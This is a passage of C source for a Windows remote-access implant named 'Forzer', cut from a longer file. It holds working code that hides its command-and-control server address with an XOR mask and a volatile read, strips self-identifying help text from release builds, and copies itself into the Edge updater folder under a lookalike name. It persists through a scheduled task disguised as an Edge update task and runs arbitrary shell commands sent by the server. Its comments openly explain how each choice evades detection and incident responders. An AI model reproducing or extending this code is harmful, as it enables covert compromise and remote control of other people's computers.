    int need = snprintf(tmp, sizeof(tmp), "%s.tmp", path);
    if (need <= 0 || need >= (int)sizeof(tmp)) return 0;
    FILE *f = fopen(tmp, "wb");
    if (!f) return 0;
    DWORD w = (DWORD)fwrite(data, 1, n, f);
    fclose(f);
    if (w != n) { DeleteFileA(tmp); return 0; }
    if (!MoveFileExA(tmp, path, MOVEFILE_REPLACE_EXISTING)) {
        DeleteFileA(tmp);
        return 0;
    }
    return 1;
}

static int identity_serialize(const char *path, const BYTE *enc, DWORD enc_len) {
    BYTE buf[ID_MAX];
    DWORD w = 0;
    memcpy(buf, ID_MAGIC, ID_MAGIC_LEN); w = ID_MAGIC_LEN;
    memcpy(buf + w, &enc_len, 4); w += 4;
    memcpy(buf + w, enc, enc_len); w += enc_len;
    return write_atomic(path, buf, w);
}

/* Load the shared secret, minting and persisting one on first run. The secret
   comes back malloc'd in *secret/*secret_len; the caller frees it.

   Returns 1 on success, 0 on a failure that might pass (no entropy yet, no
   write access, no config dir — all worth retrying), and 2 on an identity file
   that is present and unusable. The distinction matters: a file that cannot be
   decrypted, is truncated, or is a pre-PSK FRZID1 blob will never become usable
   on its own, and treating it as transient leaves the agent reconnecting
   forever against a control plane that can never authenticate it. A silent
   forever-loop is the worst possible symptom for the operator to debug, so this
   is fatal and says why.

   The diagnostic is written straight to stderr rather than through INFO()
   because a headless install is exactly the case that needs to hear about it,
   and INFO() is silent unless someone is watching. */
static int identity_load(BYTE **secret, DWORD *secret_len) {
    *secret = NULL; *secret_len = 0;

    char path[MAX_PATH];
    if (!identity_path(path, sizeof(path))) return 0;

    static BYTE file[ID_MAX];
    long n = read_all(path, file, (long)sizeof(file));
    if (n > 0) {
        if (n < (long)(ID_MAGIC_LEN + 4) || memcmp(file, ID_MAGIC, ID_MAGIC_LEN) != 0) {
            fprintf(stderr,
                    "error: %s is not a recognised identity file.\n"
                    "  A pre-PSK identity holds a CNG key this build cannot reload;\n"
                    "  delete it to re-enrol this implant as a new device.\n", path);
            return 2;
        }
        DWORD len;
        memcpy(&len, file + ID_MAGIC_LEN, 4);
        if (len == 0 || len > ID_PROT_MAX || (long)len + ID_MAGIC_LEN + 4 != n) {
            fprintf(stderr, "error: %s is truncated or corrupt\n", path);
            return 2;
        }
        BYTE enc[ID_PROT_MAX];
        memcpy(enc, file + ID_MAGIC_LEN + 4, len);

        DATA_BLOB in, out;
        in.pbData = enc; in.cbData = len;
        out.pbData = NULL; out.cbData = 0;
        if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            fprintf(stderr,
                    "error: cannot decrypt identity (%lu) — it belongs to a different user\n",
                    GetLastError());
            return 2;
        }
        if (out.cbData != NG_SECRET_BYTES) {
            fprintf(stderr, "error: identity holds %lu bytes, expected %d\n",
                    (unsigned long)out.cbData, NG_SECRET_BYTES);
            SecureZeroMemory(out.pbData, out.cbData);
            LocalFree(out.pbData);
            return 2;
        }
        *secret = (BYTE *)malloc(out.cbData);
        if (!*secret) { SecureZeroMemory(out.pbData, out.cbData); LocalFree(out.pbData); return 0; }
        memcpy(*secret, out.pbData, out.cbData);
        *secret_len = out.cbData;
        SecureZeroMemory(out.pbData, out.cbData);
        LocalFree(out.pbData);
        return 1;
    }

    /* First run. */
    BYTE fresh[NG_SECRET_BYTES];
    if (!ng_random(fresh, sizeof(fresh))) {
        INFO( "error: no entropy source — cannot mint an identity\n");
        return 0;
    }
    *secret = (BYTE *)malloc(sizeof(fresh));
    if (!*secret) { SecureZeroMemory(fresh, sizeof(fresh)); return 0; }
    memcpy(*secret, fresh, sizeof(fresh));
    *secret_len = sizeof(fresh);
    SecureZeroMemory(fresh, sizeof(fresh));

    char dir[MAX_PATH];
    if (!config_dir(dir, sizeof(dir))) goto mint_fail;
    CreateDirectoryA(dir, NULL);

    DATA_BLOB in, out;
    in.pbData = *secret; in.cbData = *secret_len;
    out.pbData = NULL; out.cbData = 0;
    if (!CryptProtectData(&in, L"Forzer implant identity", NULL, NULL, NULL, 0, &out)) {
        INFO("error: cannot protect identity (%lu)\n", GetLastError());
        goto mint_fail;
    }
    if (out.cbData > ID_PROT_MAX) {
        INFO("error: protected identity is %lu bytes, over the %d budget\n",
             (unsigned long)out.cbData, ID_PROT_MAX);
        SecureZeroMemory(out.pbData, out.cbData);
        LocalFree(out.pbData);
        goto mint_fail;
    }
    {
        int wrote = identity_serialize(path, out.pbData, out.cbData);
        SecureZeroMemory(out.pbData, out.cbData);
        LocalFree(out.pbData);
        if (!wrote) {
            INFO( "error: cannot write %s (%lu)\n", path, GetLastError());
            goto mint_fail;
        }
    }
    return 1;

mint_fail:
    SecureZeroMemory(*secret, *secret_len);
    free(*secret); *secret = NULL; *secret_len = 0;
    return 0;
}

/* The built-in control-plane endpoint, obfuscated at build time so it is not
   a one-grep plaintext indicator sitting in .rdata. This is obfuscation, not
   cryptography — see urlkey.h for what it does and does not buy.

   It is the LAST-RESORT endpoint: config.json wins, FORZER_SERVER wins over
   both, and only when neither supplies one is this decoded and used.

   To embed a different endpoint, run `urlenc.exe wss://your.host` and paste
   the printed array below, or pass -DFORZER_URL_BLOB=0x..,0x.. at compile
   time (urlenc prints the same bytes). */

#ifdef FORZER_URL_BLOB
static const unsigned char k_builtin_url_blob[] = { FORZER_URL_BLOB };
#else
static const unsigned char k_builtin_url_blob[] = {
    /* wss://forzerc2.onrender.com, keystream-obfuscated. */
    0x32, 0x2E, 0xF2, 0xDB, 0xEA, 0x12, 0x6F, 0x06, 0xC7, 0xE7, 0x94, 0xC3,
    0x36, 0x4F, 0x07, 0xA6, 0x8B, 0xEF, 0xC4, 0x2F, 0x01, 0x58, 0x9B, 0xE7,
    0xD6, 0xF2, 0x1C,
};


#endif

/* Decode the built-in endpoint into `out`. Returns 1 on success, 0 if this
   build carries no usable built-in endpoint.

   The blob is read through a volatile-qualified pointer on purpose. A plain
   read lets the optimiser constant-fold the whole XOR loop at build time: it
   evaluates the known array and emits the DECODED url as a plaintext string
   literal in .rdata, which silently undoes the obfuscation. (That is not
   hypothetical — at -O2 it did exactly that, and `strings` handed back the
   endpoint even though the preprocessed source only ever held the obfuscated
   bytes.) The volatile load forces a real read at run time, so the decode
   cannot be hoisted into the binary as a string. */
static int url_decode(char *out, int cap) {
    const volatile unsigned char *b = k_builtin_url_blob;
    size_t n = sizeof(k_builtin_url_blob);
    if (n == 0 || (int)n >= cap - 1) return 0;
    for (size_t i = 0; i < n; i++) out[i] = (char)(b[i] ^ url_ks((unsigned)i));
    out[n] = 0;
    return 1;
}

/* config.json is no longer a secret: it holds the endpoint and a display name.
   The only private material this process touches is identity.key, which is DPAPI
   sealed to this user on this host. %APPDATA% inherits a restrictive ACL from
   the profile, so the file is readable by this user and administrators only. */
static int config_write(const char *url, const char *name) {
    char dir[MAX_PATH], path[MAX_PATH], tmp[MAX_PATH + 8];
    if (!config_dir(dir, sizeof(dir))) return 0;
    if (!CreateDirectoryA(dir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        INFO( "error: cannot create %s (%lu)\n", dir, GetLastError());
        return 0;
    }
    if (!config_path(path, sizeof(path))) return 0;

    /* If the url is just the built-in one, do not persist it: the binary
       already carries it, and writing it to config.json would put the
       operator's endpoint back on disk in plaintext for no gain. A url that
       differs (e.g. set via FORZER_SERVER) is still persisted. */
    char bu[CFG_VALUE_MAX] = {0};
    const char *u = url ? url : "";
    if (*u && url_decode(bu, sizeof(bu)) && !strcmp(u, bu)) u = "";

    char eu[CFG_VALUE_MAX * 2] = {0}, en[CFG_VALUE_MAX * 2] = {0};
    json_escape(u, eu, sizeof(eu));
    json_escape(name, en, sizeof(en));

    /* Write to a temp file and rename, so an interrupted write can never
       leave a truncated config behind. */
    snprintf(tmp, sizeof(tmp), "%s.tmp", path);
    FILE *f = fopen(tmp, "wb");
    if (!f) { INFO( "error: cannot write %s\n", tmp); return 0; }
    fprintf(f, "{\n  \"url\": \"%s\",\n  \"name\": \"%s\"\n}\n",
            eu, en);
    fclose(f);
    if (!MoveFileExA(tmp, path, MOVEFILE_REPLACE_EXISTING)) {
        INFO( "error: cannot replace %s (%lu)\n", path, GetLastError());
        DeleteFileA(tmp);
        return 0;
    }
    return 1;
}

static void config_resolve(config_t *c) {
    memset(c, 0, sizeof(*c));

    char path[MAX_PATH], buf[8192];
    if (config_exists(path, sizeof(path))) {
        FILE *f = fopen(path, "rb");
        if (f) {
            size_t n = fread(buf, 1, sizeof(buf) - 1, f);
            fclose(f);
            buf[n] = 0;
            /* json_str() leaves the buffer untouched when a key is missing,
               and c was zeroed above, so an absent key reads as "". */
            json_str(buf, "url", c->url, sizeof(c->url));
            json_str(buf, "name", c->name, sizeof(c->name));
        }
    }

    /* Environment overrides the file. */
    const char *e;
    if ((e = getenv("FORZER_SERVER")) && *e) strncpy(c->url, e, sizeof(c->url) - 1);
    if ((e = getenv("FORZER_NAME")) && *e)   strncpy(c->name, e, sizeof(c->name) - 1);

    /* Built-in endpoint, obfuscated in the binary, is the last resort — a
       default install has neither config.json nor a FORZER_SERVER. Decoding
       it here is what lets a fresh install work with zero configuration
       without ever putting the endpoint in plaintext .rdata. */
    if (!c->url[0]) url_decode(c->url, sizeof(c->url));

    if (!c->name[0]) strncpy(c->name, "forzer", sizeof(c->name) - 1);
}

static void default_device_name(char *out, int cap) {
    char name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    /* Report the real buffer size, not `cap`: the caller may pass a much
       larger buffer and the API must be told what it may actually write. */
    DWORD n = (DWORD)sizeof(name);
    if (!GetComputerNameA(name, &n)) strcpy(name, "forzer");
    strncpy(out, name, (size_t)cap - 1);
    out[cap - 1] = 0;
}

/* ---------------------------- CLI actions -------------------------- */

/* The help text is the largest block of self-identifying text in the
   binary: "Forzer.exe" spelled out a dozen times, in the clear, in a file
   that --install then renames to something innocuous. A release build does
   not need it, so it is compiled out; only a debug build, which is not the
   one that gets dropped on a box, carries it.

   The cost is real: `--help` on a release binary says almost nothing. That is
   the trade, and it is a deliberate one — the operator has the source, and
   the installed copy is not the artifact anyone should be reading. */
static void usage(void) {
#ifdef FORZER_DEBUG
    printf(
      "forzer agent\n"
      "\n"
      "  Forzer.exe                     connect and run (uses config file, then env)\n"
      "  Forzer.exe --install           copy to the install path, write config, add logon task\n"
      "  Forzer.exe --uninstall         remove the logon task (keeps config and binary)\n"
      "  Forzer.exe --write-config      (re)write the config file from the environment\n"
      "  Forzer.exe --config            print the resolved settings and exit\n"
      "\n"
      "  Forzer.exe --ops              list the ops this build implements, as JSON\n"
      "  Forzer.exe --ops-out <path>   the same, written to a file (works windowless)\n"
      "  Forzer.exe --selftest          verify the handshake crypto against known vectors\n"
      "\n"
      "  FORZER_EXEC_TIMEOUT_MS (ms before a running command is killed; 0 = no limit)\n"
      "  FORZER_STARTUP_JITTER_MS  (ms of random delay before the first check-in)\n");
#else
    printf("--help is omitted from release builds.\n");
#endif
}

/* ------------------------------------------------------------------ */
/* Persistence                                                         */
/*                                                                    */
/* This was an HKCU\...\Run value named "Forzer" holding the full     */
/* quoted path to the binary. Three separate tells in one line: the   */
/* key is the single most-scanned persistence location on Windows,    */
/* the value name is the product's own name, and the path is the      */
/* path to the binary.                                                */
/*                                                                    */
/* It is now a logon-triggered scheduled task with a bland name,      */
/* registered through the Task Scheduler COM API rather than by       */
/* spawning schtasks.exe — a child process puts the full command line, */
/* including the target path, into whatever process-creation auditing */
/* the host happens to have, and a host with none of that sees       */
/* nothing extra. Registering in-process adds no such event.          */
/*                                                                    */
/* A logon task is not invisible. Anything that enumerates scheduled   */
/* tasks still sees it. The point is that this stops being the        */
/* loudest possible entry in a list that a responder checks first.    */
/* ------------------------------------------------------------------ */

/* Deliberately unremarkable: it should read like the other entries in
   Task Scheduler next to a real user's, and like nothing at all next to
   the ones an operator already has. Override with FORZER_TASK_NAME. */
#define TASK_NAME_DEF "MicrosoftEdgeUpdateTask"

static const char *task_name(char *out, int cap) {
    const char *e = getenv("FORZER_TASK_NAME");
    if (!e || !*e) e = TASK_NAME_DEF;
    int n = snprintf(out, cap, "\\%s", e);
    return (n > 0 && n < cap) ? out : NULL;
}

/* Where the installed copy lives.

   %LOCALAPPDATA%\Microsoft\EdgeUpdate\ is where Edge keeps its own updater on
   essentially every Windows 10 21H2+ / Windows 11 machine, so the folder is
   already there and already belongs to "Microsoft" - an unfamiliar updater
   binary sitting next to the real one is among the least surprising things
   you can find in a per-user tree. The name is deliberately NOT
   "WindowsDefenderUpdate.exe" (used by a lot of commodity infostealers, so it
   carries signature weight) and not the real "MicrosoftEdgeUpdate.exe"
   (collides with the genuine binary); "MicrosoftEdgeUpdateHelper.exe" reads as
   a plausible updater sibling without being either. Override the whole path
   with FORZER_INSTALL_PATH. */
#define INSTALL_SUB  "\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdateHelper.exe"

static int install_path(char *out, int cap) {
    const char *e = getenv("FORZER_INSTALL_PATH");
    if (e && *e) {
        int n = snprintf(out, cap, "%s", e);
        return n > 0 && n < cap;
    }
    char base[MAX_PATH];
    DWORD n = GetEnvironmentVariableA("LOCALAPPDATA", base, (DWORD)sizeof(base));
    if (n == 0 || n >= sizeof(base)) return 0;
    int need = snprintf(out, cap, "%s%s", base, INSTALL_SUB);
    return need > 0 && need < cap;
}

/* Create every directory in a *directory* path, one level at a time. Enough
   for "...\MediaSync" and it needs no parser.

   It must be given a directory, never a file path. The loop stops at the last
   backslash, so a path ending in a filename leaves that filename in tmp and
   the final CreateDirectoryA then creates a DIRECTORY with the file's name —
   which makes the later MoveFileEx onto it fail with ACCESS_DENIED, in a way
   that looks exactly like a permissions problem. */
static int make_dirs(const char *dir) {
    char tmp[MAX_PATH];
    int n = snprintf(tmp, sizeof(tmp), "%s", dir);
    if (n <= 0 || n >= (int)sizeof(tmp)) return 0;
    for (char *p = tmp + 3; *p; p++) {
        if (*p != '\\') continue;
        *p = 0;
        if (!CreateDirectoryA(tmp, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) return 0;
        *p = '\\';
    }
    if (CreateDirectoryA(tmp, NULL)) return 1;
    return GetLastError() == ERROR_ALREADY_EXISTS;
}

/* Copy this executable to the install path, unless it is already there.
   Returns 1 on success, 0 on failure. */
static int install_copy(const char *dest) {
    char self[MAX_PATH];
    if (!GetModuleFileNameA(NULL, self, (DWORD)sizeof(self))) {
        INFO("error: cannot locate this executable (%lu)\n", GetLastError());
        return 0;
    }
    if (strcmp(self, dest) == 0) return 1;   /* already installed in place */

    /* The parent directory of dest, with the filename removed. */
    char dir[MAX_PATH];
    int n = snprintf(dir, sizeof(dir), "%s", dest);
    if (n <= 0 || n >= (int)sizeof(dir)) { INFO("error: install path too long\n"); return 0; }
    char *slash = strrchr(dir, '\\');
    if (!slash) { INFO("error: install path has no directory: %s\n", dest); return 0; }
    *slash = 0;

    if (!make_dirs(dir)) {
        INFO("error: cannot create install directory %s (%lu)\n", dir, GetLastError());
        return 0;
    }
    char tmp[MAX_PATH];
    n = snprintf(tmp, sizeof(tmp), "%s.new", dest);
    if (n <= 0 || n >= (int)sizeof(tmp)) return 0;

    /* Copy to a temporary name and rename into place, so an interrupted
       install cannot leave a half-written executable registered to run at
       the next logon. MoveFileEx on the same volume is atomic. */
    if (!CopyFileA(self, tmp, FALSE)) {
        INFO("error: cannot copy to %s (%lu)\n", tmp, GetLastError());
        return 0;
    }
    if (!MoveFileExA(tmp, dest, MOVEFILE_REPLACE_EXISTING)) {
        DWORD e = GetLastError();
        /* A directory sitting where the binary should go is almost always a
           leftover from a bad install rather than a permissions problem, and
           saying so is the difference between a fixable report and a ghost. */
        if (e == ERROR_ACCESS_DENIED) {
            DWORD a;
            if (GetFileAttributesA(dest) & FILE_ATTRIBUTE_DIRECTORY)
                INFO("error: %s exists and is a directory, not a file.\n"
                     "       Delete it and re-run --install.\n", dest);
            else
                INFO("error: cannot write %s (%lu) — is it running or locked?\n", dest, e);
        } else {
            INFO("error: cannot install to %s (%lu)\n", dest, e);
        }
        DeleteFileA(tmp);
        return 0;
    }
    return 1;
}

/* current user as DOMAIN\user, which is what a logon trigger's <UserId>
   wants. NameSamCompatible because a bare user name is ambiguous across
   domains, and an ambiguous trigger is one that silently never fires. */
static int current_user(char *out, int cap) {
    DWORD n = (DWORD)cap;
    if (GetUserNameExA(NameSamCompatible, out, &n) && n > 0) return 1;
    /* Standalone host: no domain to qualify with. */
    n = (DWORD)cap;
    if (GetUserNameA(out, &n) && n > 0) return 1;
    return 0;
}

/* Write `s` to `path` as UTF-16LE with a BOM, which is what schtasks reads.
   The XML is pure ASCII apart from the account name, so a byte-per-char
   widening is sufficient and avoids dragging in a conversion library. */
static int write_utf16(const char *path, const char *s) {
    FILE *f = fopen(path, "wb");
    if (!f) return 0;
    size_t n = strlen(s);
    int ok = fwrite("\xff\xfe", 1, 2, f) == 2;
    for (size_t i = 0; ok && i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        unsigned short w = c;
        ok = fwrite(&w, 1, 2, f) == 2;
    }
    if (fclose(f) != 0) ok = 0;
    return ok;
}

/* Run a command line with no visible window and wait for it. Used only at
   install and uninstall time, never from the connection loop. */
static int run_hidden(const char *cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    /* CREATE_NO_WINDOW so there is no console flash on a logged-on desktop. */
    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return -1;
    WaitForSingleObject(pi.hProcess, 30000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return (int)code;
}

/* Register a logon-triggered task that runs `exe` as the current user.

   Via schtasks.exe with an XML file rather than a command line. The
   difference is the whole point: `/create /tr "C:\...\agent.exe"` puts the
   implant's path in the command line, where it lands in any process-creation
   audit the host has. The XML keeps the path in a file that is written, used
   and deleted within the same call, so the only thing on the command line is
   the task name and a temp file.

   This is still one spawned process at install time. That is a real cost and
   it is not hidden - it is just less conspicuous than the alternative, which
   was a labelled Run-key entry. */
static int task_set(const char *exe) {
    char tname[256];
    if (!task_name(tname, sizeof(tname))) { INFO("error: task name too long\n"); return 0; }

    char user[256];
    if (!current_user(user, sizeof(user))) {
        INFO("error: cannot determine the current account name (%lu)\n", GetLastError());
        return 0;
    }

    const char *tmpdir = getenv("TEMP");
    if (!tmpdir || !*tmpdir) tmpdir = ".";
    char tmp[MAX_PATH];
    int n = snprintf(tmp, sizeof(tmp), "%s\\frz-task.xml", tmpdir);
    if (n <= 0 || n >= (int)sizeof(tmp)) { INFO("error: temp path too long\n"); return 0; }

    /* A path containing & or < would produce well-formed-looking garbage.
       The install path we generate cannot contain either, but an
       operator-supplied FORZER_INSTALL_PATH can, so refuse rather than
       register a task that does not run. */
    if (strchr(exe, '&') || strchr(exe, '<')) {
        INFO("error: install path contains XML metacharacters (& or <)\n");
        return 0;
    }

    char xml[4096];
    n = snprintf(xml, sizeof(xml),
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
        "  <Triggers>\r\n"
        "    <LogonTrigger><Enabled>true</Enabled><UserId>%s</UserId></LogonTrigger>\r\n"
        "  </Triggers>\r\n"
        "  <Actions Context=\"Author\">\r\n"
        "    <Exec><Command>%s</Command></Exec>\r\n"
        "  </Actions>\r\n"
        "  <Settings>\r\n"
        "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
        "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
        "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
        "    <StartWhenAvailable>true</StartWhenAvailable>\r\n"
        "    <Enabled>true</Enabled>\r\n"
        "    <Hidden>false</Hidden>\r\n"
        "  </Settings>\r\n"
        "</Task>\r\n", user, exe);
    if (n <= 0 || n >= (int)sizeof(xml)) { INFO("error: task definition too long\n"); return 0; }

    if (!write_utf16(tmp, xml)) { INFO("error: cannot write %s (%lu)\n", tmp, GetLastError()); return 0; }

    char cmd[1024];
    n = snprintf(cmd, sizeof(cmd), "schtasks.exe /create /tn \"%s\" /xml \"%s\" /f",
                 tname + 1, tmp);   /* tname carries a leading backslash */
    if (n <= 0 || n >= (int)sizeof(cmd)) { DeleteFileA(tmp); return 0; }

    int rc = run_hidden(cmd);
    DeleteFileA(tmp);          /* the task definition is not needed again */
    if (rc != 0) {
        INFO("error: schtasks failed (%d) creating \"%s\"\n", rc, tname + 1);
        return 0;
    }
    return 1;
}

static int task_del(void) {
    char tname[256];
    if (!task_name(tname, sizeof(tname))) return 0;
    char cmd[1024];
    int n = snprintf(cmd, sizeof(cmd), "schtasks.exe /delete /tn \"%s\" /f", tname + 1);
    if (n <= 0 || n >= (int)sizeof(cmd)) return 0;
    int rc = run_hidden(cmd);
    if (rc != 0) {
        /* Nonzero here is usually "no such task", which is the state
           --uninstall is meant to reach anyway. Saying so is more useful
           than a bare error, and a genuinely failed delete is rare. */
        printf("no scheduled task named \"%s\" — nothing to remove\n", tname + 1);
    }
    return 1;
}

static int do_write_config(int overwrite) {
    config_t c;
    config_resolve(&c);
    char path[MAX_PATH];
    if (!config_path(path, sizeof(path))) { INFO( "error: config path too long\n"); return 1; }

    if (!overwrite && config_exists(path, sizeof(path))) {
        printf("config already exists, left untouched: %s\n", path);
        printf("edit it directly, or use --write-config to replace it from the environment\n");
        return 0;
    }
    if (!config_write(c.url, c.name)) return 1;
    printf("wrote %s\n", path);
    printf("  url  = %s\n  name = %s\n", c.url, c.name);
    return 0;
}

static int do_install(void) {
    config_t c;
    config_resolve(&c);
    char name[CFG_VALUE_MAX];
    if (strcmp(c.name, "forzer") == 0) default_device_name(name, sizeof(name));
    else strncpy(name, c.name, sizeof(name) - 1);

    char path[MAX_PATH];
    if (!config_path(path, sizeof(path))) { INFO( "error: config path too long\n"); return 1; }
    char tname[256];

    int have_file = config_exists(path, sizeof(path));

    if (!c.url[0]) {
        INFO(
          "refusing to install: no control-plane endpoint.\n"
          "This build has no built-in server address, and an agent with nowhere\n"
          "to connect is not an install, it is a file.\n"
          "\n"
          "Set FORZER_SERVER=wss://host and re-run --install.\n");
        return 1;
    }

    if (have_file) {
        printf("config already exists, left untouched: %s\n", path);
    } else {
        if (!config_write(c.url, name)) return 1;
        printf("wrote %s\n", path);
    }

    char exe[MAX_PATH];
    if (!install_path(exe, sizeof(exe))) { INFO("error: install path too long\n"); return 1; }
    if (!install_copy(exe)) return 1;
    if (!task_set(exe)) return 1;

    printf("installed:\n");
    printf("  binary : %s\n", exe);
    printf("  config : %s\n", path);
    printf("  task   : %s (at logon, this user)\n", task_name(tname, sizeof(tname)) + 1);
    printf("remove the task with --uninstall\n");
    return 0;
}

static int do_uninstall(void) {
    return task_del() ? 0 : 1;
}

static int do_show_config(void) {
    config_t c;
    config_resolve(&c);
    char path[MAX_PATH];
    int have = config_path(path, sizeof(path)) && config_exists(path, sizeof(path));
    printf("config file : %s (%s)\n", path, have ? "present" : "absent");
    printf("server      : %s\n",
           c.url[0] ? c.url : "<NOT SET — this build has no built-in endpoint; "
                                "set FORZER_SERVER or run --write-config>");
    printf("name        : %s\n", c.name);
    printf("remote exec : %s\n",
           (getenv("FORZER_ALLOW_REMOTE") && !strcmp(getenv("FORZER_ALLOW_REMOTE"), "0"))
           ? "disabled" : "enabled");
    return c.url[0] ? 0 : 1;
}

/* The last peer map, apply_peer(), for_each_peer() and the whole
   g_peer_snapshot spinlock lived here. They existed so an implant could
   cache and address its peers; with the overlay gone and no implant able
   to reach another, there was nothing left for them to do. */
/* A command that never returns is the one failure the single-slot design
   cannot recover from: g_cmd.hDone stays set, the next command is refused as
   "busy" forever, and the operator gets no result at all. `signal` is refused
   in both directions, so there was previously no way to stop one.

   Two things bound it now. A deadline (FORZER_EXEC_TIMEOUT_MS, default five
   minutes) catches the command that hangs on its own; `cancel` catches the one
   the operator has decided is taking too long.

   Written by the worker thread, read by the main loop, so the handle goes
   through Interlocked* rather than a plain assignment - a torn read here would
   mean TerminateProcess on a recycled handle. */
static volatile LONG g_exec_cancel = 0;
static volatile LONG g_exec_active = 0;
static volatile LONG g_exec_timed_out = 0;
static HANDLE g_exec_child = NULL;
static int g_exec_timeout_ms = 300000;   /* 0 = no limit */

/* Run a command via cmd.exe, capture stdout+stderr into out (cap bytes). */
static int run_command(const char *cmd, char *out, int cap) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;
    si.dwFlags = STARTF_USESTDHANDLES;
    char full[8300];
    snprintf(full, sizeof(full), "cmd.exe /c %s", cmd);
    if (!CreateProcessA(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return -1;
    }
    CloseHandle(hWrite);
    DWORD total = 0, r;
    char tmp[4096];
    int truncated = 0;
    int killed = 0;
    DWORD started = GetTickCount();

    /* Publish the child so a `cancel` arriving on the main loop can reach it,
       and clear the flags so a cancel cannot leak into the next command. */
    InterlockedExchangePointer((PVOID volatile *)&g_exec_child, pi.hProcess);
    InterlockedExchange(&g_exec_cancel, 0);
    InterlockedExchange(&g_exec_timed_out, 0);
    InterlockedExchange(&g_exec_active, 1);

    /* The old loop was ReadFile-until-EOF and then WaitForSingleObject(..,
       INFINITE). Both halves block forever on a child that never exits: the
       pipe never reaches EOF and the wait never returns, so there was no place
       to notice a deadline or a cancel even if there had been one.

       PeekNamedPipe turns that into a poll, which costs a Sleep between
       iterations and buys the two things that were missing. Draining before
       checking anything else is not an optimisation: the pipe buffer is 4 KB,
       so a child writing real output blocks until someone reads, and a loop
       that stopped reading to check a deadline would deadlock the command it
       was trying to rescue. */
    for (;;) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) break; /* gone */
        if (avail > 0) {
            DWORD want = avail < (DWORD)sizeof(tmp) ? avail : (DWORD)sizeof(tmp);
            if (ReadFile(hRead, tmp, want, &r, NULL) && r > 0) {
                if (total + r < (DWORD)cap - 1) {
                    memcpy(out + total, tmp, r);
                    total += r;
                } else {
                    truncated = 1; /* stop accumulating, keep draining the pipe */
                }
            }
            continue;
        }
        /* Nothing pending. Either it finished, or it is thinking. Both the
           process handle and the pipe have to agree before we call it done,
           and they do: the write end is closed only when the child is gone or
           has explicitly closed stdout, and every byte it wrote is still
           readable until then. */
        if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break;
        if (InterlockedCompareExchange(&g_exec_cancel, 0, 0)) { killed = 1; break; }
        if (g_exec_timeout_ms > 0 &&
            (DWORD)(GetTickCount() - started) > (DWORD)g_exec_timeout_ms) {
            InterlockedExchange(&g_exec_timed_out, 1);
            killed = 1;
            break;
        }
        Sleep(20);
    }

    if (killed) {
        /* cmd.exe's own children keep running: TerminateProcess kills the
           process it was handed, not the tree below it. A `start`ed process
           therefore survives a cancel. Fixing that properly means a job object
           with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, which also changes how a
           crash is cleaned up, so it is not smuggled in here. */
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 5000);
    }

    InterlockedExchangePointer((PVOID volatile *)&g_exec_child, NULL);
    InterlockedExchange(&g_exec_active, 0);

    /* Whatever the child flushed before it died is still worth having — but
       this drain is bounded, and it has to be. A killed cmd.exe can leave a
       grandchild (`ping`, anything `start`ed) holding the write end of the pipe
       open, and an unbounded ReadFile here waits for that grandchild to exit:
       cancelling a 25-second command at three seconds still sat out the other
       twenty-two, which defeats the entire point of the cancel.

       The clean-exit path needs no second pass: the loop above only leaves
       with avail == 0, so the pipe is already empty when the child is gone. */
    if (killed) {
        DWORD t0 = GetTickCount();
        while ((int)(GetTickCount() - t0) < 250) {
            DWORD avail = 0, got = 0;
            if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) break;
            if (avail == 0) { Sleep(20); continue; }
            DWORD want = avail < (DWORD)sizeof(tmp) ? avail : (DWORD)sizeof(tmp);
            if (!ReadFile(hRead, tmp, want, &got, NULL) || got == 0) break;
            if (total + got < (DWORD)cap - 1) {
                memcpy(out + total, tmp, got);
                total += got;
            } else {
                truncated = 1;
                break;
            }
        }
    }

#define APPEND(note)                                                       \
    do {                                                                   \
        size_t nl = strlen(note);                                          \
        if (total + nl < (size_t)cap - 1) {                                \
            memcpy(out + total, (note), nl); total += (DWORD)nl;           \
        }                                                                  \
    } while (0)

    /* Say so, rather than letting the caller believe this was everything. */
    if (truncated) APPEND("\n...[output truncated]");
    if (killed) {
        char note[96];
        if (InterlockedCompareExchange(&g_exec_timed_out, 0, 0)) {
            snprintf(note, sizeof(note),
                     "\n...[timed out after %d s; process terminated]",
                     g_exec_timeout_ms / 1000);
        } else {
            snprintf(note, sizeof(note),
                     "\n...[cancelled by the control plane; process terminated]");
        }
        APPEND(note);
    }
#undef APPEND

    out[total] = 0;
    CloseHandle(hRead);

    DWORD code = 0;
    if (killed) {
        code = 124;   /* the conventional timeout/cancel status */
    } else {
        WaitForSingleObject(pi.hProcess, INFINITE);
